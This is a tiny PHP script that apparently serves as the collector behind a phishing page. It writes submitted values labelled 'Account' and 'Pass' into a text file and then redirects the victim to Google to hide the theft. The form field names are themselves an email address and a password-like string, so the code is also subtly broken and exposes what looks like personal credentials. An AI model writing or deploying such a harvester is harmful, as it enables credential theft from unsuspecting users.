<?php

file_put_contents("usernames.txt", "Account: " . $_POST['taaa112@gmail.com'] . " Pass: " . $_POST['Aa900900'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
